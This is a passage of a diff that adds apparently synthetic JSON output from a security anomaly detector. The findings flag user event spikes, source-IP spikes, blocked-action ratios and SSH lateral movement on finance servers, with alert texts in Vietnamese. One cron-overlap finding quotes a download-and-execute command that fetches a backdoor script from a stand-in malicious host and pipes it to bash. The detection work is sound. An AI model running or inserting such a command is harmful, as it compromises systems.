+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 507
+        },
+        "time": null,
+        "baseline": {
+          "mean": 104.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "trinhk",
+      "severity": "CRITICAL",
+      "score": 9.10204081632653,
+      "text": "Số sự kiện của user trinhk tăng đột biến: 446 so với trung bình 98±0.",
+      "evidence": {
+        "current": 446,
+        "mean": 98.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 446
+        },
+        "time": null,
+        "baseline": {
+          "mean": 98.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_unique_src_ips_spike",
+      "subject": "anhthu",
+      "severity": "WARNING",
+      "score": 4.333333333333333,
+      "text": "Số IP nguồn khác nhau của user anhthu tăng đột biến: 13 so với trung bình 6±0.",
+      "evidence": {
+        "current": 13,
+        "mean": 6.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "unique_src_ips",
+          "value": 13
+        },
+        "time": null,
+        "baseline": {
+          "mean": 6.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_unique_src_ips_spike",
+      "subject": "linhfin",
+      "severity": "WARNING",
+      "score": 4.333333333333333,
+      "text": "Số IP nguồn khác nhau của user linhfin tăng đột biến: 13 so với trung bình 6±0.",
+      "evidence": {
+        "current": 13,
+        "mean": 6.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "linhfin",
+        "group": null,
+        "behavior": {
+          "type": "unique_src_ips",
+          "value": 13
+        },
+        "time": null,
+        "baseline": {
+          "mean": 6.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_unique_src_ips_spike",
+      "subject": "ngocmai",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "Số IP nguồn khác nhau của user ngocmai tăng đột biến: 12 so với trung bình 6±0.",
+      "evidence": {
+        "current": 12,
+        "mean": 6.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "unique_src_ips",
+          "value": 12
+        },
+        "time": null,
+        "baseline": {
+          "mean": 6.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_unique_src_ips_spike",
+      "subject": "thuongf",
+      "severity": "WARNING",
+      "score": 4.333333333333333,
+      "text": "Số IP nguồn khác nhau của user thuongf tăng đột biến: 13 so với trung bình 6±0.",
+      "evidence": {
+        "current": 13,
+        "mean": 6.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "unique_src_ips",
+          "value": 13
+        },
+        "time": null,
+        "baseline": {
+          "mean": 6.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_unique_src_ips_spike",
+      "subject": "trinhk",
+      "severity": "WARNING",
+      "score": 4.333333333333333,
+      "text": "Số IP nguồn khác nhau của user trinhk tăng đột biến: 13 so với trung bình 6±0.",
+      "evidence": {
+        "current": 13,
+        "mean": 6.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "unique_src_ips",
+          "value": 13
+        },
+        "time": null,
+        "baseline": {
+          "mean": 6.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "blocked_actions_spike",
+      "subject": "anhthu",
+      "severity": "WARNING",
+      "score": 5.7142857142857135,
+      "text": "Phát hiện 8/14 hành động bị chặn (57.1%) từ anhthu (source_ip=10.0.0.2). Chi tiết: User: anhthu | Host: filesrv-fin01 Điều này có thể cho thấy cuộc tấn công hoặc cấu hình sai.",
+      "evidence": {
+        "blocked_count": 8,
+        "total_count": 14,
+        "ratio": 0.5714285714285714,
+        "source_ip": "10.0.0.2",
+        "username": "anhthu",
+        "context": "User: anhthu | Host: filesrv-fin01"
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "blocked_actions_spike",
+          "ratio": 0.5714285714285714,
+          "count": 8,
+          "source": "10.0.0.2"
+        },
+        "time": null,
+        "baseline": {
+          "expected_ratio": 0.2
+        },
+        "extras": {
+          "reason": "High ratio of blocked/denied actions from 10.0.0.2"
+        }
+      }
+    },
+    {
+      "type": "blocked_actions_spike",
+      "subject": "root",
+      "severity": "WARNING",
+      "score": 5.6000000000000005,
+      "text": "Phát hiện 14/25 hành động bị chặn (56.0%) từ root (source_ip=192.168.1.100). Chi tiết: User: root | Host: filesrv-fin01 Điều này có thể cho thấy cuộc tấn công hoặc cấu hình sai.",
+      "evidence": {
+        "blocked_count": 14,
+        "total_count": 25,
+        "ratio": 0.56,
+        "source_ip": "192.168.1.100",
+        "username": "root",
+        "context": "User: root | Host: filesrv-fin01"
+      },
+      "prompt_ctx": {
+        "user": "root",
+        "group": null,
+        "behavior": {
+          "type": "blocked_actions_spike",
+          "ratio": 0.56,
+          "count": 14,
+          "source": "192.168.1.100"
+        },
+        "time": null,
+        "baseline": {
+          "expected_ratio": 0.2
+        },
+        "extras": {
+          "reason": "High ratio of blocked/denied actions from 192.168.1.100"
+        }
+      }
+    },
+    {
+      "type": "blocked_actions_spike",
+      "subject": "ubuntu",
+      "severity": "WARNING",
+      "score": 5.454545454545454,
+      "text": "Phát hiện 12/22 hành động bị chặn (54.5%) từ ubuntu (source_ip=192.168.1.101). Chi tiết: User: ubuntu | Host: db-fin01 Điều này có thể cho thấy cuộc tấn công hoặc cấu hình sai.",
+      "evidence": {
+        "blocked_count": 12,
+        "total_count": 22,
+        "ratio": 0.5454545454545454,
+        "source_ip": "192.168.1.101",
+        "username": "ubuntu",
+        "context": "User: ubuntu | Host: db-fin01"
+      },
+      "prompt_ctx": {
+        "user": "ubuntu",
+        "group": null,
+        "behavior": {
+          "type": "blocked_actions_spike",
+          "ratio": 0.5454545454545454,
+          "count": 12,
+          "source": "192.168.1.101"
+        },
+        "time": null,
+        "baseline": {
+          "expected_ratio": 0.2
+        },
+        "extras": {
+          "reason": "High ratio of blocked/denied actions from 192.168.1.101"
+        }
+      }
+    },
+    {
+      "type": "blocked_actions_spike",
+      "subject": "anhthu",
+      "severity": "WARNING",
+      "score": 5.882352941176471,
+      "text": "Phát hiện 10/17 hành động bị chặn (58.8%) từ anhthu (source_ip=203.0.113.100). Chi tiết: User: anhthu | Host: erpsrv01 Điều này có thể cho thấy cuộc tấn công hoặc cấu hình sai.",
+      "evidence": {
+        "blocked_count": 10,
+        "total_count": 17,
+        "ratio": 0.5882352941176471,
+        "source_ip": "203.0.113.100",
+        "username": "anhthu",
+        "context": "User: anhthu | Host: erpsrv01"
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "blocked_actions_spike",
+          "ratio": 0.5882352941176471,
+          "count": 10,
+          "source": "203.0.113.100"
+        },
+        "time": null,
+        "baseline": {
+          "expected_ratio": 0.2
+        },
+        "extras": {
+          "reason": "High ratio of blocked/denied actions from 203.0.113.100"
+        }
+      }
+    },
+    {
+      "type": "blocked_actions_spike",
+      "subject": "root",
+      "severity": "CRITICAL",
+      "score": 8.333333333333334,
+      "text": "Phát hiện 15/18 hành động bị chặn (83.3%) từ root (source_ip=203.0.113.50). Chi tiết: User: root | Host: filesrv-fin01 Điều này có thể cho thấy cuộc tấn công hoặc cấu hình sai.",
+      "evidence": {
+        "blocked_count": 15,
+        "total_count": 18,
+        "ratio": 0.8333333333333334,
+        "source_ip": "203.0.113.50",
+        "username": "root",
+        "context": "User: root | Host: filesrv-fin01"
+      },
+      "prompt_ctx": {
+        "user": "root",
+        "group": null,
+        "behavior": {
+          "type": "blocked_actions_spike",
+          "ratio": 0.8333333333333334,
+          "count": 15,
+          "source": "203.0.113.50"
+        },
+        "time": null,
+        "baseline": {
+          "expected_ratio": 0.2
+        },
+        "extras": {
+          "reason": "High ratio of blocked/denied actions from 203.0.113.50"
+        }
+      }
+    },
+    {
+      "type": "cron_job_overlap",
+      "subject": "db-fin01",
+      "severity": "CRITICAL",
+      "score": 8.0,
+      "text": "Cron job overlap: script 'wget http://malicious.com/backdoor.sh | bash' executed 91 times by 5 users. ⚠️ Có thể là kỹ thuật Defense Evasion - lợi dụng tiến trình backup/cron hợp pháp để che giấu hành vi đáng ngờ.",
+      "evidence": {
+        "script": "wget http://malicious.com/backdoor.sh | bash",
+        "execution_count": 91,
+        "unique_users": 5,
+        "users": [
+          "thuongf",
+          "trinhk",
+          "linhfin",
+          "ngocmai",
+          "anhthu"
+        ]
+      },
+      "prompt_ctx": {
+        "behavior": {
+          "type": "cron_job_overlap",
+          "defense_evasion_warning": "Đây có thể là kỹ thuật ẩn mình (Defense Evasion), lợi dụng tiến trình backup/cron hợp pháp để che giấu hành vi gửi dữ liệu trái phép ra ngoài hoặc thực thi mã độc."
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "anhthu",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'anhthu' logged in 219 times from 13 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "anhthu",
+        "login_count": 219,
+        "unique_source_ips": 13,
+        "source_ips": [
+          "10.0.0.2",
+          "10.103.117.155",
+          "10.30.185.148",
+          "10.127.63.250",
+          "192.168.1.100",
+          "203.0.113.100",
+          "10.230.65.53",
+          "10.189.173.182",
+          "10.103.170.222",
+          "203.0.113.50"
+        ],
+        "target_hosts": [
+          "filesrv-fin01",
+          "erpsrv01",
+          "db-fin01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 219,
+          "source_ips": 13
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "linhfin",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'linhfin' logged in 234 times from 13 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "linhfin",
+        "login_count": 234,
+        "unique_source_ips": 13,
+        "source_ips": [
+          "10.103.170.222",
+          "10.230.65.53",
+          "198.51.100.0",
+          "10.127.63.250",
+          "10.189.173.182",
+          "10.103.117.155",
+          "192.168.1.100",
+          "10.0.0.1",
+          "203.0.113.100",
+          "10.30.185.148"
+        ],
+        "target_hosts": [
+          "db-fin01",
+          "erpsrv01",
+          "filesrv-fin01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "linhfin",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 234,
+          "source_ips": 13
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "ngocmai",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'ngocmai' logged in 224 times from 12 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "ngocmai",
+        "login_count": 224,
+        "unique_source_ips": 12,
+        "source_ips": [
+          "198.51.100.0",
+          "10.127.63.250",
+          "10.189.173.182",
+          "10.103.117.155",
+          "10.230.65.53",
+          "10.0.0.1",
+          "10.103.170.222",
+          "192.168.1.101",
+          "172.16.0.1",
+          "203.0.113.100"
+        ],
+        "target_hosts": [
+          "db-fin01",
+          "filesrv-fin01",
+          "erpsrv01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 224,
+          "source_ips": 12
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "thuongf",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'thuongf' logged in 330 times from 13 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "thuongf",
+        "login_count": 330,
+        "unique_source_ips": 13,
+        "source_ips": [
+          "198.51.100.0",
+          "10.103.170.222",
+          "10.103.117.155",
+          "10.189.173.182",
+          "10.30.185.148",
+          "10.127.63.250",
+          "192.168.1.100",
+          "10.230.65.53",
+          "203.0.113.50",
+          "172.16.0.1"
+        ],
+        "target_hosts": [
+          "erpsrv01",
+          "db-fin01",
+          "filesrv-fin01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 330,
+          "source_ips": 13
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "trinhk",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'trinhk' logged in 298 times from 13 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "trinhk",
+        "login_count": 298,
+        "unique_source_ips": 13,
+        "source_ips": [
+          "10.189.173.182",
+          "10.103.170.222",
+          "10.230.65.53",
+          "10.30.185.148",
+          "10.127.63.250",
+          "10.103.117.155",
+          "198.51.100.0",
+          "10.0.0.1",
+          "203.0.113.100",
+          "192.168.1.101"
+        ],
+        "target_hosts": [
+          "erpsrv01",
+          "filesrv-fin01",
+          "db-fin01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 298,
+          "source_ips": 13
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    }
+  ]
+}
